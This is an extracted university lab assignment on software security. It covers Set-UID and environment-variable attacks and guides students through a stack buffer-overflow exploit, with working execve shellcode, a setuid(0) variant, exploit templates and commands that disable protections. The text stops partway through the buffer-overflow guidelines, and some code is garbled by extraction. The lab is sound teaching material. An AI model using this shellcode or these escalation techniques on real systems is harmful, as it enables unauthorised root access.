# Assignment 2 Extracted Source

- Source PDF: `assignment2/assignment2.pdf`

- Total pages: 38

## Page 1

Software Security Exercise

CS 5293: Topics on Information Security (Spring 2026)

## Contents

## 1 Introduction
### 1.1 Objective
### 1.2 Environment

## 2 Major Task: Environment Variable and Set-UID Program
### 2.1 Manipulating environment variables
### 2.2 Environment variable and Set-UID Programs
### 2.3 The PATH Environment variable and Set-UID Programs
### 2.4 The LD PRELOAD environment variable and Set-UID Programs
### 2.5 Invoking external programs using system() versus execve()
### 2.6 Capability Leaking
## 3 Major Task: Buffer Overflow Vulnerability
### 3.1 Initial setup
### 3.2 Running Shellcode
### 3.3 The Vulnerable Program
### 3.4 Exploiting the Vulnerability
### 3.5 Defeating dash’s Countermeasure
### 3.6 Defeating Address Randomization
### 3.7 Stack Guard Protection
### 3.8 Non-executable Stack Protection
### 3.9 Guidelines
## 4 Major Task: Return-to-libc Attack
### 4.1 Initial Setup
### 4.2 The Vulnerable Program
### 4.3 Exploiting the Vulnerability
### 4.4 Putting the shell string in the memory
### 4.5 Exploiting the Vulnerability
### 4.6 Address Randomization
### 4.7 Stack Guard Protection
### 4.8 Guidelines: Understanding the function call mechanism
#### 4.8.1 Find out the addresses of libc functions
#### 4.8.2 Putting the shell string in the memory
## 5 Major Task: Format String Vulnerability
### 5.1 Crash the program
### 5.2 Print out the secret[1] value
### 5.3 Modify the secret[1] value
### 5.4 Modify the secret[1] value to a pre-determined value, i.e., 80 in decimal
## 6 Acknowledgment

## Page 2

## 1 Introduction

### 1.1 Objective

The learning objective of this exercise is for you to get a deeper understanding on common vulnerabilities
in general software. After finishing the assignment, you should be able to gain a first-hand experience on
environment varibles, buffer overflow attack, return-to-libc attack, format string attack.
### 1.2 Environment

All tasks in this exercise can be done on the SEED Ubuntu 20.04 VM.

## Page 3

## 2 Major Task: Environment Variable and Set-UID Program

The learning objective of the following tasks is for you to understand how environment variables affect
program and system behaviors. Environment variables are a set of dynamic named values that can affect
the way running processes will behave on a computer. They are used by most operating systems, since
they were introduced to Unix in 1979. Although environment variables affect program behaviors, how they
achieve that is not well understood by many programmers. As a result, if a program uses environment
variables, but the programmer does not know that they are used, the program may have vulnerabilities.
So you are expected to understand how environment variables work, how they are propagated from parent
process to child, and how they affect system/program behaviors. We are particularly interested in how
environment variables affect the behavior of Set-UID programs, which are usually privileged programs.
### 2.1 Manipulating environment variables

In this task, we study the commands that can be used to set and unset environment variables. We are
using Bash in the seed account. The default shell that a user uses is set in the /etc/passwd file (the last
field of each entry). You can change this to another shell program using the command chsh (please do not
do it for this task). Please do the following:
1. Use printenv or env command to print out the environment variables. If you are interested in some
particular environment variables, such as PWD, you can use "printenv PWD" or "env | grep PWD".

2. Use export and unset to set or unset environment variables, e.g., foo=‘test string’. It should
be noted that these two commands are not seperate programs; they are two of the Bash’s internal
commands (you will not be able to find them outside of Bash).

### What to Report
- Screenshots showing the output of printenv or env.
- Demonstrate setting and unsetting an environment variable using export and unset, with screenshots

of the results.

### 2.2 Environment variable and Set-UID Programs
Set-UID is an important security mechanism in Unix operating systems. When a Set-UID program runs,
it assumes the owner’s privileges. For example, if the program’s owner is root, then when anyone runs
this program, the program gains the root’s privileges during its execution. Set-UID allows us to do many
interesting things, but it escalates the user’s privilege when executed, making it quite risky. Although the
behaviors of Set-UID programs are decided by their program logic, not by users, users can indeed affect the
behaviors via environment variables. To understand how Set-UID programs are affected, let us first figure
out whether environment variables are inherited by the Set-UID program’s process from the user’s process.

**Step 1. We are going to write a program that can print out all the environment variables in the current**
process.

## Page 4

```c
/* setuidenv.c */
#include <stdio.h>
#include <stdlib.h>
extern char **environ;
void main()
{
int i = 0;
while (environ[i] != NULL) {
printf("%s\n", environ[i]);
i++;
}
}
```

**Step 2. Compile the above program, change its ownership to root, and make it a Set-UID program.**

```c
// Assume the program name is foo.c
$ sudo gcc -o foo foo.c
$ sudo chown root foo
$ sudo chmod 4755 foo
```

**Step 3. In your Bash shell (you need to be in a normal user account, not the root account), use the export**
command to set the following environment variables (they may have already exist): (Backup these paths
before you do this task!)

- PATH
- LD LIBRARY PATH

- ANY NAME (this is an environment variable defined by you, so pick whatever name you want).
These environment variables are set in the user’s shell process. Now, run the Set-UID program from
Step 2 in the shell. After you type the name of the program in your shell, the shell forks a child process,
and uses the child process to run the program. Please check whether all the environment variables you set
in the shell process (parent) get into the Set-UID child process.

### What to Report

- Screenshots of your Set-UID program’s output.
- Which environment variables (PATH, LD LIBRARY PATH, ANY NAME) are inherited by the Set-UID child
process and which are not.
- Describe any surprises and provide your explanation.

### 2.3 The PATH Environment variable and Set-UID Programs
Because of the shell program invoked, calling system() within a Set-UID program is quite dangerous. This
```c
is because the actual behavior of the shell program can be affected by environment variables, such as PATH;
these environment variables are provided by the user, who may be malicious. By changing these variables,
malicious users can control the behavior of the Set-UID program. In Bash, you can change the PATH
```

## Page 5

environment variable in the following way (this example adds the directory /home/seed to the beginning
of the PATH environment variable):

```c
$ export PATH=/home/seed:$PATH
```

The Set-UID program below is supposed to execute the /bin/ls command; however, the programmer only
uses the relative path for the ls command, rather than the absolute path:

```c
/* myls.c */
int main()
{
system("ls");
return 0;
}
```

Please compile the above program, and change its owner to root, and make it a Set-UID program. Can
you let this Set-UID program run your code instead of /bin/ls? If you can, is your code running with the
root privilege? Describe and explain your observations.

Note: The system(cmd) function executes the /bin/sh program first, and then asks this shell program
to run the cmd command. In Ubuntu 20.04 (and several versions before), /bin/sh is actually a symbolic
link pointing to the /bin/dash shell. This shell program has a countermeasure that prevents itself from
being executed in a Set-UID process. Basically, if dash detects that it is executed in a Set-UID process, it
immediately changes the effective user ID to the process’s real user ID, essentially dropping the privilege.
Since our victim program is a Set-UID program, the countermeasure in /bin/dash can prevent our attack.
To see how our attack works without such a countermeasure, we will link /bin/sh to another shell that does
not have such a countermeasure. We have installed a shell program called zsh in our Ubuntu 20.04 VM. We
use the following commands to link /bin/sh to zsh:

```c
$ sudo ln -sf /bin/zsh /bin/sh
```

Hint: You should create your own ls.c program (e.g., print something that is different from the original
function), and compile it as normal (see below). Remember to export the path of your own ls to PATH,
and make sure you can recover the original PATH after this task.

```c
$ cat ls.c
#include <stdio.h>
int main()
{
printf("\nThis is my ls program\n");
printf("\nMy real uid is: %d\n", getuid());
printf("\nMy effective uid is: %d\n", geteuid());
return 0;
}
$ gcc -o ls ls.c
```

## Page 6

### What to Report

- Your custom ls.c code.
- Screenshots showing the Set-UID program running your code instead of /bin/ls.

- Whether your code runs with root privilege (check the effective uid via geteuid()).
- Brief explanation of how PATH manipulation enables this attack.

### 2.4 The LD PRELOAD environment variable and Set-UID Programs

In this task, we study how Set-UID programs deal with some of the environment variables. Several environ-
ment variables, including LD PRELOAD, LD LIBRARY PATH, and other LD * influence the behavior of dynamic
loader/linker. A dynamic loader/linker is the part of an operating system (OS) that loads (from persistent
storage to RAM) and links the shared libraries needed by an executable at run time.

In Linux, ld.so or ld-linux.so, are the dynamic loader/linker (each for different types of binary). Among
the environment variables that affect their behaviors, LD LIBRARY PATH and LD PRELOAD are the two that we
are concered in this task. In Linux, LD LIBRARY PATH is a colon-separated set of directories where libraries
should be searched for first, before the standard set of directories. LD PRELOAD specifies a list of additional,
user-specified, shared libraries to be loaded before all others. In this task, we will only study LD PRELOAD.
**Step 1. First, we will see how these environment variables influence the behavior of dynamic loader/linker**
when running a normal program. Please follow these steps:

1. Let us build a dynamic link library. Create the following program, and name it mylib.c. It basically
overrides the sleep() function in libc:

```c
#include <stdio.h>
void sleep (int s)
{
/* If this is invoked by a privileged program,
you can do damages here! */
printf("I am not sleeping!\n");
}
```

2. We can compile the above program using the following commands:

```c
% gcc -fPIC -g -c mylib.c
% gcc -shared -o libmylib.so.1.0.1 mylib.o -lc
```

3. Now, set the LD PRELOAD environment variable:

```c
% export LD_PRELOAD=./libmylib.so.1.0.1
```

4. Finally, compile the following program myprog, and it in the same directory as the above dynamic
link library libmylib.so.1.0.1:

## Page 7

```c
/* myprog.c */
int main()
{
sleep(1);
return 0;
}
```

**Step 2. After you have done the above, please run myprog under the following conditions, and observe**
what happens.
1. Make myprog a regular program, and run it as a normal user.

2. Make myprog a Set-UID root program, and run it as a normal user.
3. Make myprog a Set-UID root program, export the LD PRELOAD environment variable again in the root
account and run it.

4. Make myprog a Set-UID user1 program (i.e., the owner is user1, which is another user account), export
the LD PRELOAD environment variable again in a different user’s account (not-root user) and run it.

**Step 3. You should be able to observe different behaviors in the scenarios described above, even though**
you are running the same program. You need to figure out what causes the difference. Environment variables
play a role here. Please design an experiment to figure out the main causes, and explain why the behaviors
in Step 2 are different. (Hint: the child process may not inherit the LD * environment variables).
### What to Report

- Screenshots of myprog output under each of the four conditions in Step 2.
- Your experiment design and results from Step 3.

- Explanation of why the behaviors differ across the four scenarios (focusing on how LD PRELOAD is
handled for Set-UID programs).

### 2.5 Invoking external programs using system() versus execve()
Although system() and execve() can both be used to run new programs, system() is quite dangerous
if used in a privileged program, such as Set-UID programs. We have seen how the PATH environment
variable affect the behavior of system(), because the variable affects how the shell works. execve() does
not have the problem, because it does not invoke shell. Invoking shell has another dangerous consequence,
and this time, it has nothing to do with environment variables. Let us look at the following scenario.

Bob works for an auditing agency, and he needs to investigate a company for a suspected fraud. For the
investigation purpose, Bob needs to be able to read all the files in the company’s Unix system; on the other
hand, to protect the integrity of the system, Bob should not be able to modify any file. To achieve this
goal, Vince, the superuser of the system, wrote a special set-root-uid program (see below), and then gave
the executable permission to Bob. This program requires Bob to type a file name at the command line,
and then it will run /bin/cat to display the specified file. Since the program is running as a root, it can
display any file Bob specifies. However, since the program has no write operations, Vince is very sure that
Bob cannot use this special program to modify any file.

## Page 8

```c
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
int main(int argc, char *argv[])
{
char *v[3];
char *command;
```

```c
if(argc < 2) {
printf("Please type a file name.\n");
return 1;
}
```

```c
v[0] = "/bin/cat"; v[1] = argv[1]; v[2] = NULL;
command = malloc(strlen(v[0]) + strlen(v[1]) + 2);
sprintf(command, "%s %s", v[0], v[1]);
```

```c
// Use only one of the followings.
system(command);
// execve(v[0], v, NULL);
```

```c
return 0 ;
}
```

Step 1: Compile the above program, make it a root-owned Set-UID program. The program will use
system() to invoke the command. If you were Bob, can you compromise the integrity of the system? For
example, can you remove a file that is not writable to you?

Step 2: Comment out the system(command) statement, and uncomment the execve() statement; the
program will use execve() to invoke the command. Compile the program, and make it a root-owned
Set-UID. Do your attacks in Step 1 still work? Please describe and explain your observations.

### What to Report
- For Step 1 (system()): describe the attack input you used to compromise integrity (e.g., removing or
modifying a file), with screenshots.

- For Step 2 (execve()): show whether the same attack still works, with screenshots.
- Explain why system() is vulnerable to this attack but execve() is not.

### 2.6 Capability Leaking

To follow the Principle of Least Privilege, Set-UID programs often permanently relinquish their root privi-
leges if such privileges are not needed anymore. Moreover, sometimes, the program needs to hand over its
control to the user; in this case, root privileges must be revoked. The setuid() system call can be used to
revoke the privileges. According to the manual, “setuid() sets the effective user ID of the calling process.
If the effective UID of the caller is root, the real UID and saved set-user-ID are also set”. Therefore, if a
Set-UID program with effective UID 0 calls setuid(n), the process will become a normal process, with all its
UIDs being set to n.

## Page 9

When revoking the privilege, one of the common mistakes is capability leaking. The process may have
gained some privileged capabilities when it was still privileged; when the privilege is downgraded, if the
program does not clean up those capabilities, they may still be accessible by the non-privileged process.
In other words, although the effective user ID of the process becomes non-privileged, the process is still
privileged because it possesses privileged capabilities.
Compile the following program, change its owner to root, and make it a Set-UID program. Run the
program as a normal user, and describe what you have observed. Will the file /etc/zzz be modified? Please
explain your observation.

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
void main(){
int fd;
/* Assume that /etc/zzz is an important system file,
* and it is owned by root with permission 0644.
* Before running this program, you should creat
* the file /etc/zzz first. */
fd = open("/etc/zzz", O_RDWR | O_APPEND);
if (fd == -1) {
printf("Cannot open /etc/zzz\n");
exit(0);
}
/* Simulate the tasks conducted by the program */
sleep(1);
```

```c
/* After the task, the root privileges are no longer needed,
it's time to relinquish the root privileges permanently. */
setuid(getuid()); /* getuid() returns the real uid */
if (fork()) { /* In the parent process */
close (fd);
exit(0);
} else {      /* in the child process */
/* Now, assume that the child process is compromised, malicious
attackers have injected the following statements
into this process */
write (fd, "Malicious Data\n", 15);
close (fd);
}
}
```

### What to Report
- Screenshots showing whether /etc/zzz was modified after running the program as a normal user.
- Explanation of why the file can/cannot be modified despite the root privileges being dropped via

setuid(getuid()).
- Briefly explain the concept of capability leaking demonstrated by this program.

## Page 10

## 3 Major Task: Buffer Overflow Vulnerability

The learning objective of this part is for you to gain the first-hand experience on buffer-overflow vulnera-
bility by putting what they have learned about the vulnerability from class into action. Buffer overflow is
defined as the condition in which a program attempts to write data beyond the boundaries of pre-allocated
fixed length buffers. This vulnerability can be utilized by a malicious user to alter the flow control of the
program, even execute arbitrary pieces of code. This vulnerability arises due to the mixing of the storage
for data (e.g. buffers) and the storage for controls (e.g. return addresses): an overflow in the data part can
affect the control flow of the program, because an overflow can change the return address.
In this part, you will be given a program with a buffer-overflow vulnerability; the task is to develop a scheme
to exploit the vulnerability and finally gain the root privilege. In addition to the attacks, you will be guided
to walk through several protection schemes that have been implemented in the operating system to counter
against the buffer-overflow attacks. You need to evaluate whether the schemes work or not and explain why.

- Buffer overflow vulnerability and attack
- Stack layout in a function invocation

- Shellcode
- Address randomization, Non-executable stack, and StackGuard

### 3.1 Initial setup

Ubuntu and several other Linux distributions have implemented several security mechanisms to make
the buffer-overflow attack difficult. To simplify your attacks, you want to disable them first.

Address Space Randomization. Ubuntu and several other Linux-based systems use address space
layout randomization to randomize the starting address of heap and stack. This makes guessing the exact
addresses difficult; guessing addresses is one of the critical steps of buffer-overflow attacks. In this part, we
disable these features using the following commands:

```c
$ sudo sysctl -w kernel.randomize_va_space=0
```

The StackGuard Protection Scheme. The GCC compiler implements a security mechanism called
Stack Guard to prevent buffer overflows. In the presence of this protection, buffer overflow attacks would
not work. You can disable this protection during the complication using the -fno-stack-protector flag
in the command. For example, to compile a program example.c with Stack Guard disabled, you may use
the following command:

```c
$ gcc -m32 -fno-stack-protector example.c
```

Non-Executable Stack. Ubuntu used to allow executable stacks, but this has now changed: the binary
images of programs (and shared libraries) must declare whether they require executable stacks or not, i.e.,
they need to mark a field in the program header. Kernel or dynamic linker uses this marking to decide
whether to make the stack of this running program executable or non-executable. This marking is done
automatically by the recent versions of gcc, and by default, stacks are set to be non-executable. To change
that, use the following option when compiling programs:

## Page 11

#for executable stack
```c
$ gcc -m32 -z execstack -o test test.c
```

#for non-executable stack
```c
$ gcc -m32 -z noexecstack -o test test.c
```

Because the objective of this lab is to show that the non-executable stack protection does not work, you
should always compile your program using the “-z noexecstack” option in this lab.

32-bit Compilation. Our experiments use 32-bit x86 shellcode and exploit techniques. Since the SEED
Ubuntu 20.04 VM is a 64-bit system, you must compile all programs in this section with the -m32 flag to
produce 32-bit binaries. For example:

```c
$ gcc -m32 -o example example.c
```

All compilation commands in the following tasks already include the -m32 flag. If the compiler complains
about missing 32-bit libraries, install them with: sudo apt install gcc-multilib.

Configuring /bin/sh In the recent versions of Ubuntu OS, the /bin/sh symbolic link points to the
/bin/dash shell. The dash program, as well as bash, has implemented a security countermeasure that
prevents itself from being executed in a Set-UID process. Basically, if dash detects that it is executed in
a Set-UID process, it immediately changes the effective user ID to the process’s real user ID, essentially
dropping the privilege. Since our victim program is a Set-UID program, and our attack relies on running
/bin/sh, the countermeasure in /bin/dash makes our attack more difficult. Therefore, we will link /bin/sh
to another shell that does not have such a countermeasure (in later tasks, we will show that with a little bit
more effort, the countermeasure in /bin/dash can be easily defeated). We have installed a shell program
called zsh in our Ubuntu 20.04 VM. We use the following commands to link /bin/sh to zsh:
```c
$ sudo ln -sf /bin/zsh /bin/sh
```

### 3.2 Running Shellcode
Description Before you start the attack, you will need a shellcode. A shellcode is the code to launch
a shell. It has to be loaded into the memory so that we can force the vulnerable program to jump to it.
Consider the following program:

```c
#include <stdio.h>
```

```c
int main( )
{
char *name[2];
```

```c
name[0] = "/bin/sh";
name[1] = NULL;
execve(name[0], name, NULL);
}
```

## Page 12

The shellcode that we use is just the assembly version of the above program. The following program shows
you how to launch a shell by executing a shellcode stored in a buffer.

Report: Please compile and run the following code, and see whether a shell is invoked.
Please briefly describe your observations.

```c
/* call_shellcode.c */
```

```c
/*A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
const char code[] =
"\x31\xc0"   /* Line 1: xorl %eax,%eax      */
"\x50"       /* Line 2: pushl %eax          */
"\x68""//sh" /* Line 3: pushl $0x68732f2f   */
"\x68""/bin" /* Line 4: pushl $0x6e69622f   */
"\x89\xe3"   /* Line 5: movl %esp,%ebx      */
"\x50"       /* Line 6: pushl %eax          */
"\x53"       /* Line 7: pushl %ebx          */
"\x89\xe1"   /* Line 8: movl %esp,%ecx      */
"\x99"       /* Line 9: cdq                 */
"\xb0\x0b"   /* Line 10: movb $0x0b,%al     */
"\xcd\x80"   /* Line 11: int $0x80          */
;
int main(int argc, char **argv)
{
char buf[sizeof(code)];
strcpy(buf, code);
((void(*)( ))buf)( );
}
```

Use the following command to compile the code:

```c
$ gcc -m32 -z execstack -o call_shellcode call_shellcode.c
```

Something we should know about this shellcode.
1. First, the third instruction pushes “//sh”, rather than “/sh” into the stack. This is because we need
a 32-bit number here, and “/sh” has only 24 bits. Fortunately, “//” is equivalent to “/”, so we can
get away with a double slash symbol.
2. Second, before calling the execve() system call, we need to store name[0] (the address of the string),
name (the address of the array), and NULL to the %ebx, %ecx, and %edx registers, respectively. Line 5
stores name[0] to %ebx; Line 8 stores name to %ecx; Line 9 sets %edx to zero. There are other ways
to set %edx to zero (e.g., xorl %edx, %edx); the one (cdq) used here is simply a shorter instruction:
it copies the sign (bit 31) of the value in the EAX register (which is 0 at this point) into every bit
position in the EDX register, basically setting %edx to 0.
3. Third, the system call execve() is called when we set %al to 11, and execute “int $0x80”.

## Page 13

### What to Report

- Screenshots showing compilation and execution of call shellcode.c.
- Whether a shell was successfully invoked.

- Brief description of your observations.

### 3.3 The Vulnerable Program

Description The program stack.c has a buffer overflow vulnerability. It first reads an input from a file
called badfile, and then passes this input to another buffer in the function bof(). The original input can
have a maximum length of 517 bytes, but the buffer is smaller than that. Because strcpy() does not check
boundaries, buffer overflow will occur.

Since this program is a set-root-uid program, if a normal user can exploit this buffer overflow vulnerability,
the normal user might be able to get a root shell. It should be noted that the program gets its input from a
file called badfile. This file is under users’ control. Now, our objective is to create the contents for badfile,
such that when the vulnerable program copies the contents into its buffer, a root shell would be spawned.

## Page 14

```c
/* stack.c */
```

```c
/* This program has a buffer overflow vulnerability. */
/* Our task is to exploit this vulnerability */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
/* Changing this size will change the layout of the stack. */
#ifndef BUFSIZE
#define BUFSIZE 33
#endif
int bof(char *str)
{
char buffer[BUFSIZE];
/* The following statement has a buffer overflow problem */
strcpy(buffer, str);
return 1;
}
int main(int argc, char **argv)
{
char str[517];
FILE *badfile;
/* Change the size of the dummy array to randomize the parameters */
char dummy[BUFSIZE]; memset(dummy, 0, BUFSIZE);
badfile = fopen(badfile, r );
fread(str, sizeof(char), 517, badfile);
bof(str);
printf(Returned Properly\n);
return 1;
}
```

Compilation. To compile the above vulnerable program and make it set-root-uid. You can achieve this by
compiling it in the root account, and chmod the executable to 4755 (don’t forget to include the execstack
and -fno-stack-protector options to turn off the non-executable stack and StackGuard protections):

```c
$ gcc -m32 -DBUFSIZE=? -o stack -z execstack -fno-stack-protector stack.c
$ sudo chown root stack
$ sudo chmod 4755 stack
-DBUFSIZE initializes BUFSIZE with a user-specified value (up to you to determine) in the section
between #ifndef and #endif. You can replace ? with a random integer between 0 and 400.
```

### 3.4 Exploiting the Vulnerability

Description We provide you with a partially completed exploit code exploit.c. The goal of this code
is to construct contents for badfile. In exploit.c, the shellcode is given to you. You need to develop the
rest.

## Page 15

```c
/* exploit.c */
```

```c
/* A program that creates a file containing code for launching shell*/
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
char shellcode[]=
\x31\xc0     /* xorl %eax,%eax   */
\x50         /* pushl %eax       */
\x68 //sh    /* pushl $0x68732f2f */
\x68 /bin    /* pushl $0x6e69622f */
\x89\xe3     /* movl %esp,%ebx   */
\x50         /* pushl %eax       */
\x53         /* pushl %ebx       */
\x89\xe1     /* movl %esp,%ecx   */
\x99         /* cdq              */
\xb0\x0b     /* movb $0x0b,%al   */
\xcd\x80     /* int $0x80        */
;
void main(int argc, char **argv)
{
char buffer[517];
FILE *badfile;
/* Initialize buffer with 0x90 (NOP instruction) */
memset(&buffer, 0x90, 517);
/* You need to fill the buffer with appropriate contents here */
/* Save the contents to the file badfile */
badfile = fopen(./badfile, w );
fwrite(buffer, 517, 1, badfile);
fclose(badfile);
}
```

What you should know No need to use the flag -z execstack -fno-stack-protector when compiling
exploit.c. Because we are not going to overflow the buffer in this program rather than stack.c the vul-
nerable program.

After you complete the above program, compile and run it. This will generate the contents for bad-
file. Then run the vulnerable program stack. If your exploit is implemented correctly, you should be able
to get a root shell:

## Page 16

```c
$ whoami
seed
$ gcc -m32 -o exploit exploit.c
$./exploit // create the badfile
$./stack  // launch the attack by running the vulnerable program
# whoami
root
#
```

It should be noted that although you have obtained the “#” prompt, your real user id is still yourself (the
effective user id is now root). You can check this by typing the following:

# id
```c
uid=(500) euid=0(root)
```

Many commands will behave differently if they are executed as Set-UID root processes, instead of just as
root processes, because they recognize that the real user id is not root. To solve this problem, you can run
the following program to turn the real user id to root. This way, you will have a real root process, which
is more powerful.
```c
void main()
{
setuid(0); system("/bin/sh");
}
```

Python Version. For students who are more familiar with Python than C, we have provided a Python
version of the above C code. The program is called exploit.py, which can be downloaded from the lab’s
website. Students need to replace some of the values in the code with the correct ones.

## Page 17

#!/usr/bin/python3
import sys
```c
shellcode= (
"\x31\xc0" # xorl %eax,%eax
"\x50" # pushl %eax
"\x68""//sh" # pushl $0x68732f2f
"\x68""/bin" # pushl $0x6e69622f
"\x89\xe3" # movl %esp,%ebx
"\x50" # pushl %eax
"\x53" # pushl %ebx
"\x89\xe1" # movl %esp,%ecx
"\x99" # cdq
"\xb0\x0b" # movb $0x0b,%al
"\xcd\x80" # int $0x80
"\x00"
).encode('latin-1')
# Fill the content with NOP's
content = bytearray(0x90 for i in range(517))
# Put the shellcode at the end
start = 517 - len(shellcode)
content[start:] = shellcode
```

#########################################################################
```c
ret = 0xAABBCCDD # replace 0xAABBCCDD with the correct value
offset = 0 # replace 0 with the correct value
```

# Fill the return address field with the address of the shellcode
```c
content[offset:offset + 4] = (ret).to_bytes(4,byteorder='little')
#########################################################################
# Write the content to badfile
with open('badfile', 'wb') as f:
f.write(content)
Hint: Please read the subsection Guidelines of this chapter. Also you can use the GNU debugger gdb
to find the address of buffer[24] and Return Address, see Guidelines and Appendix.
```

### What to Report
- Your completed exploit.c (or exploit.py) code with a brief explanation of your solution.
- The values you chose for the return address and offset, and how you determined them (e.g., using

gdb).
- Screenshots showing the full attack: running the exploit to create badfile, then running the vulnerable
program stack, and obtaining a root shell.

### 3.5 Defeating dash’s Countermeasure
Description As we have explained before, the dash shell in Ubuntu 20.04 drops privileges when it detects
that the effective UID does not equal to the real UID. This can be observed from dash program’s changelog.
We can see an additional check in Line 9, which compares real and effective user/group IDs.

## Page 18

```c
//https://launchpadlibrarian.net/240241543/dash_0.5.8-2.1ubuntu2.diff.gz
1
//main() function in main.c has following changes:
2
++ uid = getuid();
3
++ gid = getgid();
4
++ /*
5
++ * To limit bogus system(3) or popen(3) calls in setuid binaries,
6
++ * require -p flag to work in this situation.
7
++ */
8
++ if (!pflag && (uid != geteuid() || gid != getegid())) {
9
++ setuid(uid);
10
++ setgid(gid);
11
++ /* PS1 might need to be changed accordingly. */
12
++ choose_ps1();
13
++ }
14
The countermeasure implemented in dash can be defeated. One approach is not to invoke /bin/sh in our
shellcode; instead, we can invoke another shell program. This approach requires another shell program, such
as zsh to be present in the system. Another approach is to change the real user ID of the victim process
to zero before invoking the dash program. We can achieve this by invoking setuid(0) before executing
execve() in the shellcode. In this task, we will use this approach. We will first change the /bin/sh
symbolic link, so it points back to /bin/dash:
$ sudo ln -sf /bin/dash /bin/sh
To see how the countermeasure in dash works and how to defeat it using the system call setuid(0), we
write the following C program. We first comment out Line 11 and run the program as a Set-UID program
(the owner should be root); please describe your observations. We then uncomment Line 11 and run the
program again; please describe your observations.
// dash_shell_test.c
1
#include <stdio.h>
2
#include <sys/types.h>
3
#include <unistd.h>
4
int main()
5
{
6
char *argv[2];
7
argv[0] = "/bin/sh";
8
argv[1] = NULL;
9
10
// setuid(0);
11
execve("/bin/sh", argv, NULL);
12
13
return 0;
14
}
15
The above program can be compiled and set up using the following commands (we need to make it root-
owned Set-UID program):
```

## Page 19

```c
$ gcc -m32 dash_shell_test.c -o dash_shell_test
$ sudo chown root dash_shell_test
$ sudo chmod 4755 dash_shell_test
```

From the above experiment, we will see that seuid(0) makes a difference. Let us add the assembly code
for invoking this system call at the beginning of our shellcode, before we invoke execve().

```c
char shellcode[]=
\x31\xc0 /* Line 1: xorl %eax,%eax */
\x31\xdb /* Line 2: xorl %ebx,%ebx */
\xb0\xd5 /* Line 3: movb $0xd5,%al */
\xcd\x80 /* Line 4: int $0x80 */
// ---- The code below is the same as the prior task ---
\x31\xc0
\x50
\x68 //sh
\x68 /bin
\x89\xe3
\x50
\x53
\x89\xe1
\x99
\xb0\x0b
\xcd\x80
The updated shellcode adds 4 instructions: (1) set ebx to zero in Line 2, (2) set eax to 0xd5 via Line 1 and
3 (0xd5 is setuid()’s system call number), and (3) execute the system call in Line 4. Using this shellcode,
we can attempt the attack on the vulnerable program when /bin/sh is linked to /bin/dash. Using the
above shellcode in exploit.c, try the previous attack in Subsection 3.4 again and see if you can get a root
shell.
What to Report.
• Screenshots of running dash shell test with setuid(0) commented out, and then with it uncom-
mented. Describe the difference.
```

- Your updated exploit.c (or exploit.py) using the new shellcode that includes setuid(0).
- Screenshots showing whether you can obtain a root shell when /bin/sh is linked to /bin/dash.

- Brief explanation of your results.

### 3.6 Defeating Address Randomization

Description To deploy the protection, turn on the Ubuntu’s address randomization. Run the same attack
developed in Exploiting the Vulnerability.
Report: Can you get a shell? If not, what is the problem? How does the address ran-
domization make your attacks difficult?

You can use the following instructions to turn on the address randomization:

## Page 20

```c
$ sudo /sbin/sysctl -w kernel.randomize_va_space=2
```

If running the vulnerable code once does not get you the root shell, how about running it for many times?
You can run ./stack in the following loop , and see what will happen. If your exploit program is designed
properly, you should be able to get the root shell after a while.
You can modify your exploit program to increase the probability of success (i.e., reduce the time that
you have to wait).

#!/bin/bash

```c
SECONDS=0
value=0
```

while [ 1 ]
do
```c
value=$(( $value + 1 ))
duration=$SECONDS
min=$(($duration / 60))
sec=$(($duration % 60))
echo "$min minutes and $sec seconds elapsed."
echo "The program has been running $value times so far."
./stack
done
```

### What to Report

- Screenshots showing the attack fails initially with address randomization enabled.
- Explanation of why address randomization defeats the attack.

- Screenshots of running the brute-force loop script, including how many attempts (and how long) it
took to succeed.
- Whether you eventually obtained a root shell.

### 3.7 Stack Guard Protection
To analyze one defense at a time, it is best to first turn off again address randomization, as performed in
the initial setup.

Description In our previous tasks, we disabled the Stack Guard protection mechanism in GCC when
compiling programs. In this task, you may consider reapply the attack in Subsection 3.4 Exploiting the
Vulnerability in the presence of Stack Guard. You should compile the vulnerable program ./stack again,
however, without flag -fno-stack-protector’ this time in the command. Then execute the new program and
report your observations. You may report any error messages printed.

### What to Report
- The compilation command you used (without -fno-stack-protector).

## Page 21

- Screenshots of the error messages when running the attack with Stack Guard enabled.

- Explanation of how Stack Guard detects and prevents the buffer overflow.

### 3.8 Non-executable Stack Protection
Description In our previous tasks, we intentionally make stacks executable. In this task, we recompile
our vulnerable program using the -z noexecstack option, and repeat the attack in Subsection 3.4 Ex-
ploiting the Vulnerability.

Report: Can you get a shell? If not, what is the problem? How does this protection scheme
make your attacks difficult. You can use the following instructions to turn on the non-executable stack
protection.

# gcc -m32 -o stack -fno-stack-protector -z noexecstack stack.c

It should be noted that non-executable stack only makes it impossible to run shellcode on the stack, but it
does not prevent buffer-overflow attacks, because there are other ways to run malicious code after exploiting
a buffer-overflow vulnerability.
Whether the non-executable stack protection works or not depends on the CPU and the setting of your vir-
tual machine, because this protection depends on the hardware feature that is provided by CPU. If you find
that the non-executable stack protection does not work, check our lecture notes and do some research
yourself.

### What to Report
- The compilation command you used (with -z noexecstack).

- Screenshots of the attack result with non-executable stack enabled.
- Explanation of why the shellcode cannot execute on a non-executable stack and how this protection
scheme works.

### 3.9 Guidelines
Description This section would help you to determine the return address and how to load shellcode
into the attack file.

We can load the shellcode into badfile, but it will not be executed because our instruction pointer will not
be pointing to it. One thing we can do is to change the return address to point to the shellcode.
But we have two problems: (1) we do not know where the return address is stored, and (2) we do not
know where the shellcode is stored. To solve these problems, we need to understand the stack layout the
execution enters a function. The following figure gives an example.

Finding the address of the memory that stores the return address. From the figure, we know, if
we can find out the address of buffer[] array, we can calculate where the return address is stored. Since
the vulnerable program is a Set-UID program, you can make a copy of this program, and run it with your
own privilege; this way you can debug the program (note that you cannot debug a Set-UID program). In the

## Page 22

debugger, you can figure out the address of buffer[], and thus calculate the starting point of the malicious
code. You can even modify the copied program, and ask the program to directly print out the address of
buffer[]. The address of buffer[] may be slightly different when you run the Set-UID copy, instead of
of your copy, but you should be quite close.

If the target program is running remotely, and you may not be able to rely on the debugger to find out the
address. However, you can always guess. The following facts make guessing a quite feasible approach:
- Stack usually starts at the same address.
- Stack is usually not very deep: most programs do not push more than a few hundred or a few thousand

bytes into the stack at any one time.
